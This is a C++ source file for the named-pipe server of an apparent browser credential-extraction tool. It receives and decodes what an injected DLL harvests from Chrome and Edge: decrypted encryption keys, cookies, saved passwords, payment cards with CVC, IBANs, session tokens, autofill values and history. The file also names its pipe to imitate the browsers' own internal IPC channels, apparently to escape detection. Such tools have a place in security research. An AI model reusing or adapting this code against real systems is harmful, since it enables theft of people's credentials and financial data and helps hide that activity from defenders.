// (c) Alexander 'xaitax' Hagenah
// Licensed under the MIT License. See LICENSE file in the project root for full license information.

#include "pipe_server.hpp"
#include "../core/console.hpp"
#include <iostream>
#include <vector>
#include <algorithm>
#include <sstream>
#include <regex>
#include <windows.h>
#include <wincrypt.h>

#pragma comment(lib, "crypt32.lib")

namespace Injector {

    PipeServer::PipeServer(const std::wstring& browserType)
        : m_pipeName(GenerateName(browserType)), m_browserType(browserType) {}

    void PipeServer::Create() {
        m_hPipe.reset(CreateNamedPipeW(m_pipeName.c_str(), PIPE_ACCESS_DUPLEX,
                                       PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
                                       1, 65536, 65536, 0, nullptr));
        
        if (!m_hPipe) {
            throw std::runtime_error("CreateNamedPipeW failed: " + std::to_string(GetLastError()));
        }
    }

    void PipeServer::WaitForClient() {
        if (!ConnectNamedPipe(m_hPipe.get(), nullptr) && GetLastError() != ERROR_PIPE_CONNECTED) {
            throw std::runtime_error("ConnectNamedPipe failed: " + std::to_string(GetLastError()));
        }
    }

    void PipeServer::SendConfig(bool verbose, bool fingerprint, const std::filesystem::path& output) {
        Write(verbose ? "VERBOSE_TRUE" : "VERBOSE_FALSE");
        Sleep(10);
        Write(fingerprint ? "FINGERPRINT_TRUE" : "FINGERPRINT_FALSE");
        Sleep(10);
        Write(output.string());
        Sleep(10);
        Write(Core::ToUtf8(m_browserType));
        Sleep(10);
    }

    void PipeServer::Write(const std::string& msg) {
        DWORD written = 0;
        if (!WriteFile(m_hPipe.get(), msg.c_str(), static_cast<DWORD>(msg.length() + 1), &written, nullptr)) {
            throw std::runtime_error("WriteFile failed");
        }
    }

    // Helper function to base64 decode
    std::string Base64Decode(const std::string& input) {
        if (input.empty()) return "";
        
        DWORD decodedSize = 0;
        if (!CryptStringToBinaryA(input.c_str(), (DWORD)input.size(), 
                                 CRYPT_STRING_BASE64, nullptr, &decodedSize, nullptr, nullptr)) {
            return ""; // Return empty on failure
        }
        
        std::vector<BYTE> buffer(decodedSize);
        if (!CryptStringToBinaryA(input.c_str(), (DWORD)input.size(), 
                                 CRYPT_STRING_BASE64, buffer.data(), &decodedSize, nullptr, nullptr)) {
            return ""; // Return empty on failure
        }
        
        return std::string((char*)buffer.data(), decodedSize);
    }

    void PipeServer::ProcessMessages(bool verbose) {
        const std::string completionSignal = "__DLL_PIPE_COMPLETION_SIGNAL__";
        std::string accumulated;
        char buffer[65536];
        bool completed = false;
        DWORD startTime = GetTickCount();

        Core::Console console(verbose);

        // Initialize new stats counters
        m_stats.autofill = 0;
        m_stats.history = 0;

        while (!completed && (GetTickCount() - startTime < Core::TIMEOUT_MS)) {
            DWORD available = 0;
            if (!PeekNamedPipe(m_hPipe.get(), nullptr, 0, nullptr, &available, nullptr)) {
                if (GetLastError() == ERROR_BROKEN_PIPE) break;
                break;
            }

            if (available == 0) {
                Sleep(100);
                continue;
            }

            DWORD read = 0;
            if (!ReadFile(m_hPipe.get(), buffer, sizeof(buffer) - 1, &read, nullptr) || read == 0) {
                if (GetLastError() == ERROR_BROKEN_PIPE) break;
                continue;
            }

            accumulated.append(buffer, read);

            size_t start = 0;
            size_t nullPos;
            while ((nullPos = accumulated.find('\0', start)) != std::string::npos) {
                std::string msg = accumulated.substr(start, nullPos - start);
                start = nullPos + 1;

                if (msg == completionSignal) {
                    completed = true;
                    break;
                }

                if (msg.rfind("DEBUG:", 0) == 0) {
                    console.Debug(msg.substr(6));
                }
                else if (msg.rfind("PROFILE:", 0) == 0) {
                    console.ProfileHeader(msg.substr(8));
                    m_stats.profiles++;
                }
                else if (msg.rfind("APP_KEY:", 0) == 0) {
                    console.KeyDecrypted(msg.substr(8));
                    m_stats.hasAppKey = true;
                    m_stats.noAbe = false;  // Clear since we have a key
                }
                else if (msg.rfind("OS_KEY:", 0) == 0) {
                    console.OsKeyDecrypted(msg.substr(7));
                    m_stats.hasOsKey = true;
                    m_stats.noAbe = false;  // Clear since we have a key
                }
                else if (msg.rfind("NO_KEYS:", 0) == 0) {
                    console.Error("No usable encryption keys found: " + msg.substr(8));
                    m_stats.noAbe = true;
                    // hasAppKey and hasOsKey remain false (default)
                }
                else if (msg.rfind("ASTER_KEY:", 0) == 0) {
                    console.AsterKeyDecrypted(msg.substr(10));
                }
                else if (msg.rfind("COOKIES:", 0) == 0) {
                    size_t sep = msg.find(':', 8);
                    if (sep != std::string::npos) {
                        int count = std::stoi(msg.substr(8, sep - 8));
                        int total = std::stoi(msg.substr(sep + 1));
                        m_stats.cookies += count;
                        m_stats.cookiesTotal += total;
                        console.ExtractionResult("Cookies", count, total);
                    }
                }
                else if (msg.rfind("PASSWORDS:", 0) == 0) {
                    int count = std::stoi(msg.substr(10));
                    m_stats.passwords += count;
                    console.ExtractionResult("Passwords", count);
                }
                else if (msg.rfind("CARDS:", 0) == 0) {
                    int count = std::stoi(msg.substr(6));
                    m_stats.cards += count;
                    console.ExtractionResult("Cards", count);
                }
                else if (msg.rfind("IBANS:", 0) == 0) {
                    int count = std::stoi(msg.substr(6));
                    m_stats.ibans += count;
                    console.ExtractionResult("IBANs", count);
                }
                else if (msg.rfind("TOKENS:", 0) == 0) {
                    int count = std::stoi(msg.substr(7));
                    m_stats.tokens += count;
                    console.ExtractionResult("Tokens", count);
                }
                // NEW: Autofill summary parsing
                else if (msg.rfind("AUTOFILL:", 0) == 0) {
                    int count = std::stoi(msg.substr(9));
                    m_stats.autofill += count;
                    console.ExtractionResult("Autofill", count);
                }
                // NEW: History summary parsing
                else if (msg.rfind("HISTORY:", 0) == 0) {
                    int count = std::stoi(msg.substr(8));
                    m_stats.history += count;
                    console.ExtractionResult("History", count);
                }
                else if (msg.rfind("DATA:", 0) == 0) {
                    std::string data = msg.substr(5);
                    size_t sep = data.find('|');
                    if (sep != std::string::npos) {
                        console.DataRow(data.substr(0, sep), data.substr(sep + 1));
                    }
                }
                else if (msg.rfind("COOKIE_DETAIL:", 0) == 0) {
                    // Format: COOKIE_DETAIL:BASE64(domain)|BASE64(name)|BASE64(value)|expires|secure|httponly|BASE64(path)
                    std::string data = msg.substr(14);
                    std::vector<std::string> parts;
                    size_t pos = 0;
                    while ((pos = data.find('|')) != std::string::npos) {
                        parts.push_back(data.substr(0, pos));
                        data.erase(0, pos + 1);
                    }
                    parts.push_back(data);
                    
                    if (parts.size() == 7) {
                        // Base64 decode ALL text fields
                        std::string domain = Base64Decode(parts[0]);
                        std::string name = Base64Decode(parts[1]);
                        std::string value = Base64Decode(parts[2]);
                        std::string expires = parts[3];  // numeric
                        bool secure = parts[4] == "1";
                        bool httpOnly = parts[5] == "1";
                        std::string path = Base64Decode(parts[6]);
                        
                        console.DisplayCookie(domain, name, value, expires, secure, httpOnly, path);
                    }
                }
                else if (msg.rfind("PASSWORD_DETAIL:", 0) == 0) {
                    // Format: PASSWORD_DETAIL:BASE64(url)|BASE64(username)|BASE64(password)
                    std::string data = msg.substr(16);
                    std::vector<std::string> parts;
                    size_t pos = 0;
                    while ((pos = data.find('|')) != std::string::npos) {
                        parts.push_back(data.substr(0, pos));
                        data.erase(0, pos + 1);
                    }
                    parts.push_back(data);
                    
                    if (parts.size() == 3) {
                        // Base64 decode ALL fields
                        std::string url = Base64Decode(parts[0]);
                        std::string username = Base64Decode(parts[1]);
                        std::string password = Base64Decode(parts[2]);
                        
                        console.DisplayPassword(url, username, password);
                    }
                }
                else if (msg.rfind("CARD_DETAIL:", 0) == 0) {
                    // Format: CARD_DETAIL:BASE64(name)|BASE64(number)|BASE64(expiry)|BASE64(cvc)
                    std::string data = msg.substr(12);
                    std::vector<std::string> parts;
                    size_t pos = 0;
                    while ((pos = data.find('|')) != std::string::npos) {
                        parts.push_back(data.substr(0, pos));
                        data.erase(0, pos + 1);
                    }
                    parts.push_back(data);
                    
                    if (parts.size() == 4) {
                        // Base64 decode ALL fields
                        std::string name = Base64Decode(parts[0]);
                        std::string number = Base64Decode(parts[1]);
                        std::string expiry = Base64Decode(parts[2]);
                        std::string cvc = Base64Decode(parts[3]);
                        
                        console.DisplayCard(name, number, expiry, cvc);
                    }
                }
                else if (msg.rfind("IBAN_DETAIL:", 0) == 0) {
                    // Format: IBAN_DETAIL:BASE64(nickname)|BASE64(iban)
                    std::string data = msg.substr(12);
                    size_t pos = data.find('|');
                    if (pos != std::string::npos) {
                        // Base64 decode ALL fields
                        std::string nickname = Base64Decode(data.substr(0, pos));
                        std::string iban = Base64Decode(data.substr(pos + 1));
                        
                        console.DisplayIBAN(nickname, iban);
                    }
                }
                else if (msg.rfind("TOKEN_DETAIL:", 0) == 0) {
                    // Format: TOKEN_DETAIL:BASE64(service)|BASE64(token)|BASE64(binding_key)
                    std::string data = msg.substr(13);
                    std::vector<std::string> parts;
                    size_t pos = 0;
                    while ((pos = data.find('|')) != std::string::npos) {
                        parts.push_back(data.substr(0, pos));
                        data.erase(0, pos + 1);
                    }
                    parts.push_back(data);
                    
                    if (parts.size() >= 2) {
                        // Base64 decode ALL fields
                        std::string service = Base64Decode(parts[0]);
                        std::string token = Base64Decode(parts[1]);
                        
                        std::string bindingKey = "";
                        if (parts.size() >= 3) {
                            bindingKey = Base64Decode(parts[2]);
                        }
                        
                        console.DisplayToken(service, token);
                    }
                }
                // NEW: Autofill detail parsing
                else if (msg.rfind("AUTOFILL_DETAIL:", 0) == 0) {
                    // Format: AUTOFILL_DETAIL:BASE64(field_name)|BASE64(value)
                    std::string data = msg.substr(16);
                    size_t pos = data.find('|');
                    if (pos != std::string::npos) {
                        // Base64 decode ALL fields
                        std::string fieldName = Base64Decode(data.substr(0, pos));
                        std::string value = Base64Decode(data.substr(pos + 1));
                        
                        console.DisplayAutofill(fieldName, value);
                    }
                }
                // NEW: History detail parsing
                else if (msg.rfind("HISTORY_DETAIL:", 0) == 0) {
                    // Format: HISTORY_DETAIL:BASE64(url)|BASE64(title)|visit_count|last_visit_time
                    std::string data = msg.substr(15);
                    std::vector<std::string> parts;
                    size_t pos = 0;
                    while ((pos = data.find('|')) != std::string::npos) {
                        parts.push_back(data.substr(0, pos));
                        data.erase(0, pos + 1);
                    }
                    parts.push_back(data);
                    
                    if (parts.size() == 4) {
                        // Base64 decode text fields
                        std::string url = Base64Decode(parts[0]);
                        std::string title = Base64Decode(parts[1]);
                        std::string visitCount = parts[2];
                        std::string lastVisitTime = parts[3];
                        
                        console.DisplayHistory(url, title, std::stoi(visitCount), lastVisitTime);
                    }
                }
                // NEW: Fingerprint parsing
                else if (msg.rfind("FINGERPRINT_START:", 0) == 0) {
                    std::string browser = msg.substr(18);
                    console.BrowserHeader(browser + " Fingerprint");
                    console.ProfileHeader("Metadata");
                }
                else if (msg.rfind("FINGERPRINT:", 0) == 0) {
                    int count = std::stoi(msg.substr(12));
                    console.ExtractionResult("Fingerprint", count);
                }
                else if (msg.rfind("FINGERPRINT_DATA:", 0) == 0) {
                    std::string data = msg.substr(17);
                    size_t sep = data.find('|');
                    if (sep != std::string::npos) {
                        console.DataRow(data.substr(0, sep), data.substr(sep + 1));
                    }
                }
                else if (msg.rfind("[-]", 0) == 0) {
                    console.Error(msg.substr(4));
                }
                else if (msg.rfind("[!]", 0) == 0) {
                    console.Warn(msg.substr(4));
                }
                else {
                    if (verbose && !msg.empty()) {
                        console.Debug(msg);
                    }
                }
            }
            accumulated.erase(0, start);
        }

        // Show key summary after processing all messages
        if (m_stats.hasAppKey || m_stats.hasOsKey) {
            console.Debug("");
            console.KeySummary(m_stats.hasAppKey, m_stats.hasOsKey);
        }
}
    std::wstring PipeServer::GenerateName(const std::wstring& browserType) {
        DWORD pid = GetCurrentProcessId();
        DWORD tid = GetCurrentThreadId();
        DWORD tick = GetTickCount();

        DWORD id1 = (pid ^ tick) & 0xFFFF;
        DWORD id2 = (tid ^ (tick >> 16)) & 0xFFFF;
        DWORD id3 = ((pid << 8) ^ tid) & 0xFFFF;

        std::wstring pipeName = L"\\\\.\\pipe\\";
        std::wstring lower = browserType;
        std::transform(lower.begin(), lower.end(), lower.begin(), ::towlower);

        wchar_t buffer[128];

        if (lower == L"chrome" || lower == L"chrome-beta") {
            static const wchar_t* patterns[] = {
                L"chrome.sync.%u.%u.%04X",
                L"chrome.nacl.%u_%04X",
                L"mojo.%u.%u.%04X.chrome"
            };
            swprintf_s(buffer, patterns[(id1 + id2) % 3], id1, id2, id3);
        } else if (lower == L"edge") {
            static const wchar_t* patterns[] = {
                L"msedge.sync.%u.%u",
                L"msedge.crashpad_%u_%04X",
                L"LOCAL\\msedge_%u"
            };
            swprintf_s(buffer, patterns[(id2 + id3) % 3], id1, id2);
        } else {
            swprintf_s(buffer, L"chromium.ipc.%u.%u", id1, id2);
        }

        pipeName += buffer;
        return pipeName;
    }

}